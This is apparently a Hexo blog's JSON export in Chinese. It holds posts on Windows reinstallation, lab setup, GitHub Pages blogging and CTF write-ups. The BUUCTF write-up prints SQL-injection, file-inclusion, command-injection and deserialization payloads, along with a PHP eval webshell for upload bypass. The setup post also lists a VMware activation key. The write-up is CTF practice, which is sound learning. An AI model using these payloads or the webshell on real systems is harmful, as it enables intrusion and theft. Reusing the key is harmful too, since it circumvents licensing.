{"meta":{"title":"会飞的鱼的Blog","subtitle":"学习中","description":"一个简简单单的博客","author":"flyingfish","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2018-09-30T10:23:38.000Z","updated":"2021-02-24T13:16:03.422Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"404","date":"2018-09-30T09:25:30.000Z","updated":"2021-02-24T13:17:45.197Z","comments":true,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2021-02-24T13:15:53.233Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-02-24T13:28:16.346Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2021-02-24T13:16:51.190Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"WIN系统安装小白教程","slug":"小白装机教程","date":"2021-02-23T08:27:40.000Z","updated":"2021-02-25T15:54:05.415Z","comments":true,"path":"2021/02/23/xiao-bai-zhuang-ji-jiao-cheng/","link":"","permalink":"http://example.com/2021/02/23/xiao-bai-zhuang-ji-jiao-cheng/","excerpt":"","text":"我现在一般使用的装机方法是先把PE系统安装到外置存储介质中，然后再在PE中安装系统。这种方法的好处是主要将U盘等制作好之后，下次就可以直接使用了，不需要再次折腾，适合我这样的经常进行重装系统的人。 至于网络上常见的老毛桃或者其他类似软件，因为会带有一些广告，不是很纯净，所以这里不是很推荐使用。 准备工作 1个存储介质（U盘，硬盘等），容量不需要太大，8GB以上就差不多了，因为还要存放系统ISO镜像，win10系统还是比较大的 一台可以正常使用的电脑，用于PE盘的制作 提前下载好我们使用的pe系统，这里选择的是优启通（https://www.upe.net/），原因就是这个比较纯净 类似的还有微PE（http://www.wepe.com.cn/download.html），也是一个不错的选择 你所需要重装系统的电脑的品牌，这一项是用于查找进入BIOS需要摁哪个键 一些基本的计算机知识 简单的英语或者有查阅翻译的能力（进入BIOS后会用到） 提问的艺术（https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md） 到了这里前期准备就结束了，接下来大致分为两个阶段 PE系统的安装 WIN系统的安装 PE系统的安装（U盘的制作）这里以优启通作为演示，因为版本比较新 可以看到右下角有三个图标，分别是安装到U盘，移动硬盘，生成ISO，我们根据自己的存储设备选择U盘或者移动硬盘，这里我采用的是移动硬盘，一块来自希捷500GB的机械硬盘，这里直接全新制作就可以。 制作好之后我们就可以通过进入BIOS，修改启动选项来进入到我们制作的PE中去，但在此之前，我们还需要下载好所需要安装的系统ISO镜像，这里推荐一个网站，我告诉你（https://msdn.itellyou.cn/）这个网站里面有着Windows系统的原版镜像以供下载。下载好镜像之后，就到了第二步了，WIN系统的安装。 WIN系统的安装首先我们需要知道你的电脑型号是怎么样进入BIOS的，这一点可以去网上查找，一般是通过摁F2，F12，ESC，DELETE，这几个键来进入的。查找好之后，我们就可以重启你需要重新安装系统的电脑（这时要确保你在上一步制作的U盘或者硬盘连接在你所需要安装系统的电脑上），在启动时连续多次摁特定键来进入BIOS，找到Boot Manage这个选项（可能不同的BIOS这里的名称不一样，但大多都带有Boot字样），将我们制作好的设备调整到第一启动位置，具体调节方法可以阅读BIOS内文字。之后进入PE系统。","categories":[],"tags":[{"name":"教程","slug":"教程","permalink":"http://example.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"BUUCTF Write-up","slug":"BUUCTF-WriteUp","date":"2021-01-16T09:44:59.000Z","updated":"2021-02-25T15:58:21.519Z","comments":true,"path":"2021/01/16/buuctf-writeup/","link":"","permalink":"http://example.com/2021/01/16/buuctf-writeup/","excerpt":"","text":"WEB[HCTF 2018]WarmUp启动环境，打开网址是一张滑稽，没什么用，看一下源码，发现有注释。 访问source.php，直接给了源码，进行代码审计。 分两块，第一块是emmm::checkFile，里面做了一些判断。 第二块是一个include，文件包含，我们要绕过验证，也就是上面的checkFile方法。 hint.php include触发的三个判断条件全为真时，include才执行。 checkFile为真 第一个if，page需要设置并且为字符串 第二个if，page需要在白名单中 _page是page从开始到?的位置截取的一段子串 第三个if，_page需要在白名单中 _page进行url解码 _page再进行相同截取 第四个if，_page需要在白名单中 所以我们构造payload的时候，需要反着来构造，需要截取，就添加，需要url解码，我们就进行编码 首先构造以下命令，保证最后_page在白名单中 ?file=source.php 接下来构造出include的flag ?file=source.php?../../../../../../../ffffllllaaaagggg 然后url编码两次 ?file=source.php%253F/../../../../../../../ffffllllaaaagggg payload就构造完成了。 [强网杯 2019]随便注开局就是一个输入框，先看看简单的注入，判断出闭合符为单引号 1&#39; &#x2F;&#x2F;报错 1&#39;# &#x2F;&#x2F;正常 1&#39; and 1&#x3D;1# &#x2F;&#x2F;正常 1&#39; and 1&#x3D;2# &#x2F;&#x2F;正常，false 接下来获得列数，列数为2 1&#39; order by 1# 1&#39; order by 2# 1&#39; order by 3# &#x2F;&#x2F;报错 尝试用select，发现被过滤 return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); 到这里就没思路了，看wp，是堆叠注入，就是一次执行多条命令，之间用分号分隔 1';show databases;# 下来查表 1';show tables;# 下来查字段 1';show columns from `1919810931114514`;# 看到有个flag字段，应该就在这里 接下来是获取flag中的内容 这里有两种方法 方法一：改名 将表名words换为其他的，类似于word1 将表名1919810931114514换为words 将列名flag换为id 通过使用alter,rename，构造payload 1' ; rename tables `words` to `word1` ; rename tables `1919810931114514` to `words` ; alter table `words` change `flag` `id` varchar(100);# 改完名之后，直接查看就可以得到flag，因为回显的数据默认是来自word表的 方法二：预处理语句 通过使用prepare，execute，deallocate命令来绕过验证，这里是用了concat拼接 1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;# [极客大挑战 2019]EasySQL1万能密码 [极客大挑战 2019]Havefun1看源码，有一段注释 直接get传参试试，成了 [SUCTF 2019]EasySQL1看wp，大佬直接盲猜SQL语句 select $_POST[‘query’] || flag from Flag *,1 直接一把梭哈 下来是做法二： 1;set sql_mode=PIPES_AS_CONCAT;select 1 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数 [ACTF2020 新生赛]Include1根据题目，文件包含 payload： ?file=php://filter/read=convert.base64-encode/resource=flag.php 这里有点想不通为什么要用这个 PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZDZlYTU5ZTktMjZjNC00MTlmLTkyMzgtNDFhY2E3ZGRlMDkxfQo&#x3D; &lt;?php echo \"Can you find out the flag?\"; //flag&#123;d6ea59e9-26c4-419f-9238-41aca7dde091&#125; [极客大挑战 2019]Secret File1首先看看源码，发现有个Archive_room.php 访问，发现有一个按钮，是指向action.php，然后我们到了end.php 这一步需要抓包 得到有一个secr3t.php 得知flag在flag.php里面，还给了源码，代码审计，有一个include，文件包含 然后发现过滤了一些伪协议，filter可以用，像上一道题目那样构造payload ?file=php://filter/read=convert.base64-encode/resource=flag.php PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ODQzNGQxMWUtM2M4NS00MjZjLTljOTUtYmRkNjllNjNhZjMzfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D; &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>FLAG&lt;/title> &lt;/head> &lt;body style=\"background-color:black;\">&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br> &lt;h1 style=\"font-family:verdana;color:red;text-align:center;\">啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1>&lt;br>&lt;br>&lt;br> &lt;p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\"> &lt;?php echo \"我就在这里\"; $flag = 'flag&#123;8434d11e-3c85-426c-9c95-bdd69e63af33&#125;'; $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd' ?> &lt;/p> &lt;/body> &lt;/html> [极客大挑战 2019]LoveSQL1用万能密码可以登录进去 还是SQLi的流程 ?username=1' order by 1%23&amp;password=123 先判断一下字段，有三个字段 接下来是寻找注入点 ?username=1' union select 1,2,3%23&amp;password=123 爆数据库,geek ?username=1' union select 1,database(),3%23&amp;password=123 爆表名,geekuser,l0ve1ysq1 ?username=1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123 爆字段，id,username,password ?username=1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23&amp;password=123 得flag ?username=1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&amp;password=123 [GXYCTF2019]Ping Ping Ping1ping命令执行 首先ping本地（127.0.0.1） ?ip=127.0.0.1 用管道符或者分号 我们首先来尝试管道符 ?ip=127.0.0.1||ls 可以看到回显有两个文件，flag.php和index.php，显然我们是需要查看flag.php里面的内容，用linux里面的命令cat ?ip=127.0.0.1||cat flag.php 提示说空格问题，那么我们先绕过空格，方法是替换为其他可以代表空格的字符，例如 ${IFS} ?ip=127.0.0.1||cat$&#123;IFS&#125;flag.php 提示说{}问题，那换一个 ?ip=127.0.0.1||cat$IFS$1flag.php flag被过滤了，我们尝试去看index.php /?ip= |\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123; echo preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match); die(\"fxck your symbol!\"); &#125; else if(preg_match(\"/ /\", $ip))&#123; die(\"fxck your space!\"); &#125; else if(preg_match(\"/bash/\", $ip))&#123; die(\"fxck your bash!\"); &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123; die(\"fxck your flag!\"); &#125; $a = shell_exec(\"ping -c 4 \".$ip); echo \" \"; print_r($a); &#125; ?> 可以看到flag过滤了/,*,`` 常用的几种都过滤了，不过可以使用编码 ?ip=127.0.0.1||`echo$IFS$1Y2F0IGZsYWcucGhw$IFS$1|$IFS$1base64$IFS$1-d` [ACTF2020 新生赛]Exec1查看源码 这里我们可以看到命令执行的语句 -c&lt;完成次数&gt; 设置完成要求回应的次数 还是先和上面一样，稍有不同是这道题目使用了POST传参 ?target=127.0.0.1||cat /flag [护网杯 2018]easy_tornado1SSTI 服务端模板注入 [极客大挑战 2019]Knife1这道题很简单，蚁剑或者菜刀直接连就可以 密码就是Syc，也就是Post的变量 然后返回最上层，就可以看到flag [RoarCTF 2019]Easy Calc1 查看源码，发现调用了calc.php?num 访问calc.php，直接给了源码，过滤了一些字符，没思路了，看wp 是利用了php解析特性 ?num=phpinfo() ?%20num=phpinfo() 上面的两行命令，php解析是一样的，但是waf检测是不一样的，waf会按照两个变量来处理，这样就可以绕过waf 所以我们先看根目录里面有什么东西，构造命令 ?%20num=var_dump(scandir(chr(47))) var_dump是打印参数内容，scandir是查看参数目录里的内容和目录，chr(47)就是”/“，”/“被过滤了，我们使用chr(47)绕过 可以看到有一个f1agg，我们查看它的内容 ?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) file_get_contents是将整个文件读入一个字符串 [极客大挑战 2019]Http1看源码，发现有个Secret.php 访问，提示 It doesn’t come from ‘https://www.Sycsecret.com&#39; 我们使用bp伪造referer Please use “Syclover” browser 修改UA No!!! you can only read this locally!!! XFF伪造 GET &#x2F;Secret.php HTTP&#x2F;1.1 Host: node3.buuoj.cn:28669 User-Agent: &quot;Syclover&quot; browser Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8 Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age&#x3D;0 X-Forwarded-For: 127.0.0.1 referer: https:&#x2F;&#x2F;www.Sycsecret.com [极客大挑战 2019]PHP1提示说有备份的习惯，扫一下目录，扫不出来。。。看wp www.zip下载下来，有个flag.php，里面是假的 看index.php，先include class.php，然后传参，反序列化 于是去看class.php，代码审计 Name类，两个变量$username，$password 当username=admin，password=100时，输出flag 构造反序列化 &lt;?php class Name&#123; private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password)&#123; $this->username = $username; $this->password = $password; &#125; &#125; $a = new Name('admin', 100); var_dump(serialize($a)); ?> ?select=O:4:\"Name\":2:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;&#125; 反序列化先执行__wakeup()，该方法会对username重新赋值，需要跳过该方法 当反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup() ?select=O:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;&#125; private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。 因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀。 字符串长度也包括所加前缀的长度 ?select=O:4:\"Name\":3:&#123;s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;&#125; [极客大挑战 2019]Upload1文件上传 GIF98a &lt;script language=\"php\">eval($_POST['cmd']);&lt;/script> bp抓包修改 上传成功，在upload目录下 蚁剑连接 最上层找到flag [极客大挑战 2019]BabySQL1?username=admin&amp;password=123 %27 ununionion seselectlect 1,2,3 %23 在这里使用了双写绕过，猜测这里使用了replace，替换关键字为空 总共有三列，并判断注入点为2，3 ?username=admin&amp;password=123 %27 ununionion seselectlect 1,2,version() %23 Maria DB下的一个函数，用来看版本 ?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,2,database()%20%23 这是当前连接的数据库的名字，我们还需要看一下所有的数据库 ?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata)%20%23 ?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'%20%23 再看一下ctf库 发现Flag表，爆字段 ?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='Flag' %20%23 flag字段里面看内容 ?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,database(),group_concat(flag) frfromom ctf.Flag %20%23 [ACTF2020 新生赛]Upload1发现是文件上传 提示说只能上传图片 抓包修改后缀为phtml 得到路径，菜刀连接，得到flag [ACTF2020 新生赛]BackupFile1根据题目提示下载备份文件，index.php.bak 接下来代码审计，发现是弱类型比较 ?key=123 [HCTF 2018]admin1登录用户名admin，密码123，登录成功 随便注册一个账户登录，再修改密码源码里面发现提示 把代码clone到本地 代码审计 在routes.py里面的register()，login()，change()三个函数里面都有strlower函数 #!/usr/bin/env python # -*- coding:utf-8 -*- from flask import Flask, render_template, url_for, flash, request, redirect, session, make_response from flask_login import logout_user, LoginManager, current_user, login_user from app import app, db from config import Config from app.models import User from forms import RegisterForm, LoginForm, NewpasswordForm from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep from io import BytesIO from code import get_verify_code @app.route('/code') def get_code(): image, code = get_verify_code() # 图片以二进制形式写入 buf = BytesIO() image.save(buf, 'jpeg') buf_str = buf.getvalue() # 把buf_str作为response返回前端，并设置首部字段 response = make_response(buf_str) response.headers['Content-Type'] = 'image/gif' # 将验证码字符串储存在session中 session['image'] = code return response @app.route('/') @app.route('/index') def index(): return render_template('index.html', title = 'hctf') @app.route('/register', methods = ['GET', 'POST']) def register(): if current_user.is_authenticated: return redirect(url_for('index')) form = RegisterForm() if request.method == 'POST': name = strlower(form.username.data) if session.get('image').lower() != form.verify_code.data.lower(): flash('Wrong verify code.') return render_template('register.html', title = 'register', form=form) if User.query.filter_by(username = name).first(): flash('The username has been registered') return redirect(url_for('register')) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash('register successful') return redirect(url_for('login')) return render_template('register.html', title = 'register', form = form) @app.route('/login', methods = ['GET', 'POST']) def login(): if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form) @app.route('/logout') def logout(): logout_user() return redirect('/index') @app.route('/change', methods = ['GET', 'POST']) def change(): if not current_user.is_authenticated: return redirect(url_for('login')) form = NewpasswordForm() if request.method == 'POST': name = strlower(session['name']) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash('change successful') return redirect(url_for('index')) return render_template('change.html', title = 'change', form = form) @app.route('/edit', methods = ['GET', 'POST']) def edit(): if request.method == 'POST': flash('post successful') return redirect(url_for('index')) return render_template('edit.html', title = 'edit') @app.errorhandler(404) def page_not_found(error): title = unicode(error) message = error.description return render_template('errors.html', title=title, message=message) def strlower(username): username = nodeprep.prepare(username) return username 这里涉及到一个Unicode编码问题 ᴬᴰᴹᴵᴺ //register ADMIN //login admin //change 通过三次转换可以修改admin的密码，从而进行登录 [极客大挑战 2019]BuyFlag1在pay.php里面有注释提示 &lt;!-- ~~~post money and password~~~ if (isset($_POST['password'])) &#123; $password = $_POST['password']; if (is_numeric($password)) &#123; echo \"password can't be number&lt;/br>\"; &#125;elseif ($password == 404) &#123; echo \"Password Right!&lt;/br>\"; &#125; &#125; --> is_numeric()和strcmp()函数绕过 is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后 查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断 strmp函数在php5.3版本之前如果传入的数据是非字符串类型，函数将报错并返回0，即判断相等，我们可以传入数组或者object来绕过 password=404%00&amp;money[]=1 同时cookie那里也要修改为1 得到flag [SUCTF 2019]CheckIn1题目给了源码，进去看一下，有个wp，里面提示说.user.ini https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html p牛的博客里面提到过 https://xz.aliyun.com/t/6091 先知社区有一篇专门就这道题目讨论.user.ini auto_prepend_file 主要是利用了这一选项 当我们指定某一文件时，该文件会被包含在执行的PHP文件中 //.user,ini GIF89a auto_prepend_file=demo.jpg GIF98a &lt;script language=\"php\">eval($_POST['cmd']);&lt;/script> [BJDCTF2020]Easy MD51通过抓包可以发现提示 *Hint: select * from ‘admin’ where password=md5($pass,true)* ffifdyop在被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’ 等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数 登录成功之后，查看源码，有提示 &lt;!-- $a = $GET['a']; $b = $_GET['b']; if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend. --> md5bypass可以采用数组，0e，md5碰撞，这里用数组绕过 ?a[]=1&amp;b[]=2 &lt;?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2']))&#123; echo $flag; &#125; 这里还是可以数组绕过 ?param1[]=1&amp;param2[]=2 [ZJCTF 2019]NiZhuanSiWei1&lt;?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123; echo \"&lt;br>&lt;h1>\".file_get_contents($text,'r').\"&lt;/h1>&lt;/br>\"; if(preg_match(\"/flag/\",$file))&#123; echo \"Not now!\"; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125; &#125; else&#123; highlight_file(__FILE__); &#125; ?> 代码审计一波 要传三个值text，file，password text是file_get_contents读取字符串，我们可以通过data伪协议来构造 text=data://text/plain,welcome to the zjctf file可以通过fillter伪协议来获取useless.php的源码 file=php://filter/read=convert.base64-encode/resource=useless.php &lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this->file))&#123; echo file_get_contents($this->file); echo \"&lt;br>\"; return (\"U R SO CLOSE !///COME ON PLZ\"); &#125; &#125; &#125; ?> password会经过反序列化 password=O:4:\"Flag\":1:&#123;s:4:\"file\";s:8:\"flag.php\";&#125; 最后payload构造如下 ?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:\"Flag\":1:&#123;s:4:\"file\";s:8:\"flag.php\";&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Write-up","slug":"Write-up","permalink":"http://example.com/tags/Write-up/"}]},{"title":"基本环境搭建","slug":"基本环境搭建","date":"2021-01-05T05:24:15.000Z","updated":"2021-02-25T15:57:39.655Z","comments":true,"path":"2021/01/05/ji-ben-huan-jing-da-jian/","link":"","permalink":"http://example.com/2021/01/05/ji-ben-huan-jing-da-jian/","excerpt":"","text":"VM ware软件安装https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html 下载安装 激活码： ZF3R0-FHED2-M80TY-8QYGC-NPKYF WIN10虚拟机安装ISO镜像下载 MSDN https://msdn.sjjzm.com/win10.html Python JDK安装https://www.python.org/ 和普通软件安装类似 https://www.oracle.com/java/technologies/javase-jdk15-downloads.html jdk需要配置环境变量 https://www.runoob.com/w3cnote/windows10-java-setup.html 浏览器插件https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search https://addons.mozilla.org/zh-CN/firefox/addon/noscript/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search https://addons.mozilla.org/zh-CN/firefox/addon/max-hackbar/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search BurpSuite抓包 Sqlmaphttp://sqlmap.org/ Ubuntuhttps://cn.ubuntu.com/download https://www.bilibili.com/video/BV1z5411b7Yr Kalihttps://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/ https://www.bilibili.com/video/BV1yv411t7ns","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"},{"name":"教程","slug":"教程","permalink":"http://example.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"基于Github Pages + Hexo的个人博客搭建","slug":"基于Github-Pages+Hexo的个人博客搭建","date":"2021-01-05T03:26:26.000Z","updated":"2021-02-25T15:57:50.191Z","comments":true,"path":"2021/01/05/ji-yu-github-pages-hexo-de-ge-ren-bo-ke-da-jian/","link":"","permalink":"http://example.com/2021/01/05/ji-yu-github-pages-hexo-de-ge-ren-bo-ke-da-jian/","excerpt":"","text":"前期准备 Node.js https://nodejs.org/zh-cn/ Git https://git-scm.com/ Github账号 开始搭建 创建Github仓库 配置SSH 第一次使用在git bash里面输入以下命令 ssh-keygen -t rsa -C &quot;your Email address&quot; 敲击三次回车 在C:\\Users\\user name\\.ssh 下面找到id_rsa.pub文件，记事本复制里面的内容 在设置里面找到SSH and GPG keys选项，点击右面的New SSH key 将刚才复制好的公钥粘贴到下面的文本框里面，Title可以随便起，Add SSH key。 到这一步SSH key就已经设置好了。 我们可以用以下命令测试连接 ssh -T git@github.com 输入yes，如果看到 You’ve successfully authenticated, but GitHub does not provide shell access. 说明配置无误。 git config --global user.name &quot;xxxx&quot;&#x2F;&#x2F; user name git config --global user.email &quot;xxx@emil.com&quot; &#x2F;&#x2F;email address 安装hexo 准备一个新文件夹用来存放hexo文件 git bash下输入命令(路径无所谓) npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org &#x2F;&#x2F;npm换淘宝源 npm install -g hexo &#x2F;&#x2F;全局安装hexo，遇到warning不用管 现在路径切换到刚才准备的文件夹 cd &#39;directory&#39; &#x2F;&#x2F;切换到directory目录下 hexo init &#x2F;&#x2F;初始化 到这里，本地的hexo就搭建好了，后续配置的修改可以自己去官网查看 https://hexo.io/zh-cn/docs/ push到github 在存放hexo代码的文件夹里面找到_config.yml文件，打开，翻到最下面。 git bash npm install hexo-deployer-git --save hexo g &#x2F;&#x2F;构造 hexo d &#x2F;&#x2F;上传 GitHub Pages需要加载时间，上传之后可能不会立刻解析，等待一段时间后，即可看到博客。","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"},{"name":"教程","slug":"教程","permalink":"http://example.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"DMCTF Write-up","slug":"DMCTF-WriteUp","date":"2020-11-28T03:22:55.000Z","updated":"2021-02-25T15:57:23.209Z","comments":true,"path":"2020/11/28/dmctf-writeup/","link":"","permalink":"http://example.com/2020/11/28/dmctf-writeup/","excerpt":"","text":"MISCCheck Indmctf{Welcome_to_dmctf2020} 签到题 fakezipzip伪加密 WinHex打开，修改加密位 修改为00 00，保存 解压出来，是一个flag.txt 音乐符号加密 文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn) flag{da1ada1a} Base familyXUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td”^w$Q8+8T])e.llK?zgS:+C]llUG:z1=ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;duRBGjg0!I+xjm(fh)]IF:&gt;omN8=m+Xp(X0:U8Sj5|8p.o[i0:%.qu}%=&lt;D CTF在线工具-在线base91编码|在线base91解码|base91编码|base91解码 (ssleye.com) 3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW CTF在线工具-在线base58编码|在线base58解码|base58编码|base58解码|base58check (ssleye.com) JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5 CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (ssleye.com) NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q&#x3D; 666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d 小写转大写，Base16 666C61677B7930755F616C72336164795F6B6E30775F7468335F4261736566616D316C797D flag&#123;y0u_alr3ady_kn0w_th3_Basefam1ly&#125; SlientEye HTML解码 - 在线HTML解码器 (convertstring.com) flag{n1_bu_j1ang_wu_d3} 编码之王 社会主义核心价值观编码 CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (ssleye.com) 佛曰编码 与佛论禅 (keyfc.net) 新佛曰编码 新约佛论禅/佛曰加密 - PcMoe! Jsfuck编码 浏览器控制台解码 DMCTF{Wow_you_kn0w_more_eNcoding} jpgsteg 这道题用了JPHS这个工具 这里让我们输入密码，根据题目的提示，盲猜123456（虽然我是问大佬的。。。） 分离出一个文本 敲击码，对应图片名称Tap Code 按照表解码 flag{ohhamazing} Collision根据题目名字可以大致猜出用CRC32碰撞，然后上脚本跑就可以 脚本如下 